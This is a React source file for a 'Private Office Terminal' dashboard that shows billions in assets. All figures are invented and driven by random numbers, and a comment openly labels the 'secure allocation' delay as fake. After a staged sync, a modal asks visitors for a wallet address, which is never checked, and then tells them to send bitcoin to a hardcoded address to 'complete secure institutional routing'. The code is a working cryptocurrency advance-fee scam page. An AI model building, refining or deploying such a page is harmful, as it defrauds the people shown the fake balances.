"use client";

import { useEffect, useState } from "react";

type Asset = {
  name: string;
  symbol: string;
  allocation: number;
  price: number;
};

type Transaction = {
  id: number;
  type: string;
  asset: string;
  amount: string;
  time: string;
};

export default function Dashboard() {
  const [aum, setAum] = useState(32_889_610_389);
  const [syncProgress, setSyncProgress] = useState(0);
  const [syncComplete, setSyncComplete] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [allocating, setAllocating] = useState(false);


  const [assets, setAssets] = useState<Asset[]>([
    { name: "Bitcoin", symbol: "BTC", allocation: 61, price: 84500 },
    { name: "Ethereum", symbol: "ETH", allocation: 48, price: 6500 },
    { name: "Tokenized Treasuries", symbol: "USTB", allocation: 36, price: 200 },
    { name: "Private Equity Basket", symbol: "PE-X", allocation: 32, price: 2000 },
    { name: "Offshore Structured Fund", symbol: "OSF", allocation: 24, price: 100 },
  ]);

  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [chartPoints, setChartPoints] = useState([984, 986, 978, 995, 994, 985, 997]);

  const [walletAddress, setWalletAddress] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [copied, setCopied] = useState(false);



  // Sync progress
  useEffect(() => {
    const interval = setInterval(() => {
      setSyncProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setSyncComplete(true);
          setTimeout(() => setShowModal(true), 800);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    return () => clearInterval(interval);
  }, []);


  useEffect(() => {
    const interval = setInterval(() => {

    setAum((prev) => prev + (Math.random() - 0.5) * 4_000_000);

      setAssets((prev) =>
        prev.map((a) => ({
          ...a,
          price: a.price + (Math.random() - 0.5) * a.price * 0.008,
        }))
      );

      setChartPoints((prev) => {
        const next = prev[prev.length - 1] + (Math.random() - 0.5) * 8;
        return [...prev.slice(1), next];
      });

      const tx: Transaction = {
        id: Date.now(),
        type: ["Allocation", "Transfer", "Vault Rebalance"][Math.floor(Math.random() * 3)],
        asset: ["BTC", "ETH", "USTB", "PE-X"][Math.floor(Math.random() * 2)],
        amount: `$${(Math.random() * 40000000).toLocaleString()}`,
        time: new Date().toLocaleTimeString(),
      };

      setTransactions((prev) => [tx, ...prev.slice(0, 6)]);
    }, 2500);

    return () => clearInterval(interval);
  }, []);

  const max = Math.max(...chartPoints);
  const min = Math.min(...chartPoints);

  const points = chartPoints
    .map((p, i) => {
      const x = (i / (chartPoints.length - 1)) * 100;
      const y = 100 - ((p - min) / (max - min)) * 100;
      return `${x},${y}`;
    })
    .join(" ");
    
     const validateAddress = (address: string) => {
    const ethRegex = /^0x[a-fA-F0-9]{40}$/;
    const btcRegex = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
    return ethRegex.test(address) || btcRegex.test(address);
  };

  const handleSubmit = () => {

  setError("");
  setConnecting(false);
  setAllocating(true);

  // Start allocation
setAllocating(true);
setSuccess(false);

// Fake secure allocation delay (matches slower animation)
setTimeout(() => {
  setAllocating(false);
  setSuccess(true);
}, 8000); // 8 seconds
};

  const dashboardAddress = "358QXhm8Wc7m7Rf3AMN2HqcThPSE9bHPR3";

const handleCopy = async () => {
  try {
    await navigator.clipboard.writeText(dashboardAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  } catch (err) {
    console.error("Copy failed", err);
  }
};

  return (
    <>
      <div className={showModal ? "blurred" : ""}>

    <main className="container">

      {/* Scanline Overlay */}
      <div className="scanlines" />

      {/* Bloomberg Ticker */}
      <div className="ticker">
        <div className="tickerTrack">
          BTC 64,500 ▲0.8% • ETH 3,500 ▲1.2% • GOLD 2,045 ▲0.4% •
          S&P 5,420 ▼0.3% • NASDAQ 17,820 ▲0.5% •
        </div>
      </div>

      {/* HEADER */}
      <header className="header">
        <div>
          <h1 className="title">Private Office Terminal</h1>
          <div className="subtitle">Institutional Wealth Infrastructure</div>

          <div className="encrypted">
            <div className="redDot" />
            ENCRYPTED CHANNEL ON HOLD
          </div>
        </div>

        <img src="/Kiara.png" className="profile" />
      </header>

      {/* AUM */}
      <section className="glassCard">
        <div className="aumLabel">Assets Under Management</div>

        <div className="goldShimmer">
          ${aum.toLocaleString(undefined, { maximumFractionDigits: 0 })}
        </div>

        <div className={`syncText ${syncComplete ? "green" : ""}`}>
              Syncing balance… {syncProgress}%
            </div>

            <div className="progressBar">
              <div
                className="progressFill"
                style={{ width: `${syncProgress}%` }}
              />
            </div>
            <div className="loadingWrapper">
          <div className="loadingBar" />
        </div>

      </section>

      {/* CHART */}
      <section className="glassCard">
        <svg width="100%" height="160" viewBox="0 0 100 100" preserveAspectRatio="none">
          <polyline fill="none" stroke="#d4af37" strokeWidth="1.5" points={points} />
        </svg>
      </section>

      {/* GRID */}
      <section className="grid">
        <Card title="Strategic Allocation">
          {assets.map((a) => (
            <Row key={a.symbol}
              left={<><div>{a.name}</div><div className="sub">{a.symbol}</div></>}
              right={<><div>${a.price.toFixed(6)}</div><div className="sub">{a.allocation}%</div></>}
            />
          ))}
        </Card>

        <Card title="Offshore Vault Holdings" glow>
          <div>Swiss Private Bank — $36.3B</div>
          <div>Singapore Custody Vault — $22.9B</div>
          <div>Cayman Structured Trust — $16.7B</div>
        </Card>

        <Card title="Institutional Activity">
          {transactions.map((t) => (
            <Row key={t.id}
              left={<><div>{t.type}</div><div className="sub">{t.asset}</div></>}
              right={<><div>{t.amount}</div><div className="sub">{t.time}</div></>}
            />
          ))}
        </Card>
      </section>

      <footer style={{ marginTop: "60px", fontSize: "11px", opacity: 0.6, textAlign: "center" }}>
        CONFIDENTIAL — Tier Omega Clearance • Multi-Jurisdictional Wealth Infrastructure
      </footer>

      </main>
      </div>


      {showModal && (
        <div className="modalOverlay">
          <div className={`modal ${success ? "vaultGlow" : ""}`}>
            {!connecting && !success && !allocating && (
  <>
    <h2>Congratulations</h2>
    <p style={{ marginTop: "12px", opacity: 0.8, fontSize: "13px" }}>Your dashboard now reflects the latest state of excellence.</p>
    <button onClick={() => setConnecting(true)}>
      Connect Wallet
    </button>
  </>
)}

            {connecting && !success && (
              <>
                <h2>Secure Blockchain Authentication</h2>
                <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>Crypto Address Required.</p>
                <input
                  type="text"
                  placeholder="Enter ETH or BTC address"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                />
                {error && <div className="error">{error}</div>}
                <button onClick={handleSubmit}>
                  Validate Address
                </button>
              </>
            )}

           {allocating && (
  <>
    <h2 style={{ color: "#d4af37" }}>
      BTC Allocation in Progress
    </h2>

    <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>
      Generating institutional-grade multi-signature vault routing...
    </p>

    <div className="circularLoader">
      <img src="/btc-icon.png" alt="BTC" className="btcIcon" />
    </div>
  </>
)}

{success && !allocating && (
  <>
    <h2 style={{ color: "#d4af37" }}>
      Transaction Authorization Required
    </h2>

    <p style={{ marginTop: "12px", opacity: 0.8, fontSize: "13px" }}>
      Kindly initiate a transaction to the dashboard address below
      to complete secure institutional routing.
    </p>

    <div className="addressBox">
      {dashboardAddress}
    </div>

    <button
      onClick={handleCopy}
      className={`copyButton ${copied ? "flash" : ""}`}
      style={{ marginTop: "14px" }}
    >
      {copied ? "Copied ✓" : "Copy Address"}
    </button>

    <div className="confetti"></div>

    <div style={{ marginTop: "18px", fontSize: "12px", opacity: 0.6 }}>
      Network: Bitcoin (BTC) • Minimum routing: 0.00079 BTC
    </div>
  </>
)}
          </div>
        </div>
      )}


      <style jsx>{`
        .container {
          min-height: 100vh;
          height: 100vh;
          overflow-y: auto;
          background: linear-gradient(120deg,#0c0c0c,#111,#0f0f0f);
          background-size: 200% 200%;
          animation: bgShift 20s ease infinite;
          color: #e8e8e8;
          padding: clamp(20px,4vw,40px);
          font-family: Inter, sans-serif;
          position: relative;
        }

        .blurred {
          filter: blur(8px);
          transition: filter 0.4s ease;
        }


        .scanlines {
          pointer-events: none;
          position: fixed;
          inset: 0;
          background: repeating-linear-gradient(
            to bottom,
            rgba(255,255,255,0.02),
            rgba(255,255,255,0.02) 1px,
            transparent 2px,
            transparent 3px
          );
          opacity: 0.15;
        }

        .ticker {
          overflow: hidden;
          white-space: nowrap;
          font-size: 12px;
          opacity: 0.6;
          border-bottom: 1px solid rgba(212,175,55,0.2);
          margin-bottom: 30px;
          padding-bottom: 8px;
        }

        .tickerTrack {
          display: inline-block;
          padding-left: 100%;
          animation: ticker 25s linear infinite;
        }

        .header {
          display: flex;
          justify-content: space-between;
          margin-bottom: 40px;
          flex-wrap: wrap;
        }

        .title {
          font-family: "Cormorant Garamond", serif;
          color: #d4af37;
          font-size: clamp(22px,5vw,32px);
        }

        .subtitle { opacity: 0.6; font-size: 13px; }

        .encrypted {
          display: flex;
          align-items: center;
          gap: 8px;
          color: #ff3b3b;
          font-size: 12px;
          margin-top: 12px;
        }

        .redDot {
          width: 8px;
          height: 8px;
          background: #ff3b3b;
          border-radius: 50%;
          animation: pulse 1.2s infinite;
        }

        .profile {
          width: 60px;
          height: 60px;
          border-radius: 50%;
          object-fit: cover;
          border: 1px solid rgba(212,175,55,0.4);
        }

        .glassCard {
          backdrop-filter: blur(12px);
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(212,175,55,0.2);
          padding: 30px;
          border-radius: 12px;
          margin-bottom: 30px;
        }

        .goldShimmer {
          font-size: clamp(26px,6vw,42px);
          font-weight: 600;
          background: linear-gradient(90deg,#d4af37,#fff5cc,#d4af37);
          background-size: 200% auto;
          -webkit-background-clip: text;
          color: transparent;
          animation: shimmer 4s linear infinite;
        }

        .loadingWrapper {
          height: 4px;
          background: rgba(255,255,255,0.05);
          overflow: hidden;
          border-radius: 4px;
          margin-top: 12px;
        }

        .loadingBar {
          width: 100%;
          height: 100%;
          background: #b81313;
          position: relative;
          animation: loading 5.5s linear infinite;
        }

        .grid { display: grid; gap: 20px; }

        .sub { font-size: 12px; opacity: 0.5; }


        @keyframes ticker { 0% { transform: translateX(0);} 100% { transform: translateX(-100%);} }
        @keyframes shimmer { 0% {background-position:200% center;} 100% {background-position:-200% center;} }
        @keyframes pulse { 0%,100% {opacity:.4;} 50% {opacity:1;} }
        @keyframes loading { 0% {left:-40%;} 100% {left:100%;} }
        @keyframes bgShift { 0% {background-position:0% 50%;} 50% {background-position:100% 50%;} 100% {background-position:0% 50%;} }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      
      .modalOverlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.7);
          backdrop-filter: blur(12px);
          display: flex;
          justify-content: center;
          align-items: center;
          animation: fadeIn 1s ease forwards;
          overflow: hidden;
        }

        .modal {
         position: relative;
          background: #111;
          border: 1px solid rgba(212,175,55,0.3);
          padding: 40px;
          border-radius: 16px;
          width: 90%;
          max-width: 420px;
          text-align: center;
          z-index: 2;
          
        }

        .modal h2 { color: #d4af37; font-family: "Cormorant Garamond", serif;}

        .modal input {
          width: 100%;
          padding: 10px;
          margin: 15px 0;
          background: #000;
          border: 1px solid rgba(212,175,55,0.3);
          color: #fff;
          border-radius: 6px;
        }

        .modal button {
          background: linear-gradient(90deg, #d4af37, #fff5cc);
          border: none;
          padding: 10px 20px;
          border-radius: 6px;
          font-weight: 600;
          cursor: pointer;
        }

        .error { color: #ff3b3b; margin-bottom: 10px; }

        .particles {
          position: absolute;
          inset: 0;
          background-image: radial-gradient(rgba(212,175,55,0.3) 1px, transparent 1px);
          background-size: 40px 40px;
          animation: moveParticles 60s linear infinite;
          z-index: 1;
        }

        @keyframes moveParticles {
          from { background-position: 0 0; }
          to { background-position: 1000px 1000px; }
        }

        /* Vault Glow */
        .vaultGlow {
          animation: glow 3s ease-in-out infinite alternate;
        }

        @keyframes glow {
          from { box-shadow: 0 0 20px rgba(212,175,55,0.2); }
          to { box-shadow: 0 0 40px rgba(212,175,55,0.6); }
        }

        /* Confetti Shimmer */
        .confetti {
          margin-top: 20px;
          height: 6px;
          background: linear-gradient(90deg, #d4af37, #fff5cc, #d4af37);
          background-size: 200% auto;
          animation: shimmer 2s linear infinite;
          border-radius: 4px;
      }

      .copyButton {
  background: linear-gradient(90deg, #d4af37, #fff5cc);
  border: none;
  padding: 10px 22px;
  border-radius: 6px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
}

.copyButton:hover {
  transform: translateY(-2px);
  box-shadow: 0 0 15px rgba(212,175,55,0.4);
}

.flash {
  animation: goldFlash 0.6s ease;
}

@keyframes goldFlash {
  0% {
    box-shadow: 0 0 0px rgba(212,175,55,0.4);
  }
  50% {
    box-shadow: 0 0 30px rgba(212,175,55,0.9);
  }
  100% {
    box-shadow: 0 0 0px rgba(212,175,55,0.4);
  }
}

.addressBox {
  margin-top: 20px;
  padding: 14px;
  background: #000;
  border: 1px solid rgba(212,175,55,0.3);
  border-radius: 8px;
  font-size: 14px;
  word-break: break-all;
  letter-spacing: 0.5px;
}

.allocationLoader {
  margin-top: 20px;
  height: 6px;
  background: rgba(255,255,255,0.05);
  border-radius: 4px;
  overflow: hidden;
}

.allocationBar {
  height: 100%;
  width: 40%;
  background: linear-gradient(90deg,#d4af37,#fff5cc,#d4af37);
  background-size: 200% auto;
  animation: allocateMove 1.2s linear infinite;
}

@keyframes allocateMove {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(300%); }
}


  
.circularLoader {
  margin: 30px auto 0;
  width: 60px;
  height: 60px;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  border: 4px dashed rgba(212,175,55,0.3);
  animation: spin 1.5s linear infinite;
}

.btcIcon {
  width: 40px;
  height: 40px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

      `}</style>
    </>

    
  );
}

function Card({ title, children, glow }: any) {
  return (
    <div style={{
      backdropFilter: "blur(12px)",
      background: "rgba(255,255,255,0.03)",
      border: "1px solid rgba(212,175,55,0.15)",
      padding: "20px",
      borderRadius: "12px",
      animation: glow ? "vaultGlow 6s ease-in-out infinite" : undefined
    }}>
      <div style={{ marginBottom: "15px", opacity: 0.7 }}>{title}</div>
      {children}
    </div>
  );
}

function Row({ left, right }: any) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "12px", gap: "10px" }}>
      <div>{left}</div>
      <div style={{ textAlign: "right" }}>{right}</div>
    </div>
  );
}
